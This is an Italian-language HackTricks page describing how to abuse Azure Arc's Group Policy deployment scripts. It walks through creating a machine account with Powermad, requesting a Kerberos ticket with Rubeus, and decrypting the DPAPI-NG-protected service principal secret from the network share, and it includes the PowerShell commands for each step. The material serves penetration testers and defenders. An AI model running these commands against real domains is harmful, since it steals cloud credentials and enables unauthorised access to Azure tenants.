# Az - Script di distribuzione GPO vulnerabile di Azure Arc

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team di HackTricks AWS)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

- Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
- Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
- Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
- **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

### Identificazione dei problemi

Azure Arc consente l'integrazione di nuovi server interni (server del dominio connessi) in Azure Arc utilizzando il metodo dell'oggetto Group Policy. Per facilitare ci√≤, Microsoft fornisce un toolkit di distribuzione necessario per avviare la procedura di integrazione. All'interno del file ArcEnableServerGroupPolicy.zip, √® possibile trovare i seguenti script: DeployGPO.ps1, EnableAzureArc.ps1 e AzureArcDeployment.psm1.

Quando eseguito, lo script DeployGPO.ps1 esegue le seguenti azioni:

1. Crea il GPO di integrazione dei server Azure Arc all'interno del dominio locale.
2. Copia lo script di integrazione EnableAzureArc.ps1 nella condivisione di rete designata creata per il processo di integrazione, che contiene anche il pacchetto di installazione di Windows.

Durante l'esecuzione di questo script, gli amministratori di sistema devono fornire due parametri principali: **ServicePrincipalId** e **ServicePrincipalClientSecret**. Inoltre, richiede altri parametri come il dominio, l'FQDN del server che ospita la condivisione e il nome della condivisione. Ulteriori dettagli come l'ID tenant, il gruppo di risorse e altre informazioni necessarie devono essere forniti anche allo script.

Un segreto crittografato viene generato nella directory AzureArcDeploy sulla condivisione specificata utilizzando la crittografia DPAPI-NG. Il segreto crittografato √® memorizzato in un file chiamato encryptedServicePrincipalSecret. Evidenze di ci√≤ possono essere trovate nello script DeployGPO.ps1, dove la crittografia viene eseguita chiamando ProtectBase64 con $descriptor e $ServicePrincipalSecret come input. Il descrittore √® composto dai SID dei gruppi Domain Computer e Domain Controller, garantendo che il ServicePrincipalSecret possa essere decifrato solo dai gruppi di sicurezza Domain Controllers e Domain Computers, come indicato nei commenti dello script.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Sfruttare

Abbiamo le seguenti condizioni:

1. Abbiamo penetrato con successo nella rete interna.
2. Abbiamo la capacit√† di creare o assumere il controllo di un account computer all'interno di Active Directory.
3. Abbiamo scoperto una condivisione di rete contenente la directory AzureArcDeploy.

Ci sono diversi metodi per ottenere un account macchina all'interno di un ambiente AD. Uno dei pi√π comuni √® sfruttare il limite dell'account macchina. Un altro metodo coinvolge il compromettere un account macchina attraverso ACL vulnerabili o varie altre misconfigurazioni.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Una volta ottenuto un account macchina, √® possibile autenticarsi utilizzando questo account. Possiamo utilizzare il comando runas.exe con il flag netonly o utilizzare pass-the-ticket con Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Utilizzando il TGT per il nostro account computer memorizzato in memoria, possiamo utilizzare lo script seguente per decifrare il segreto principale del servizio.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativamente, possiamo utilizzare [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

A questo punto, possiamo raccogliere le informazioni rimanenti necessarie per connetterci ad Azure dal file ArcInfo.json, che √® memorizzato nella stessa condivisione di rete del file encryptedServicePrincipalSecret. Questo file contiene dettagli come: TenantId, servicePrincipalClientId, ResourceGroup e altro. Con queste informazioni, possiamo utilizzare Azure CLI per autenticarci come il service principal compromesso.

## Riferimenti

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
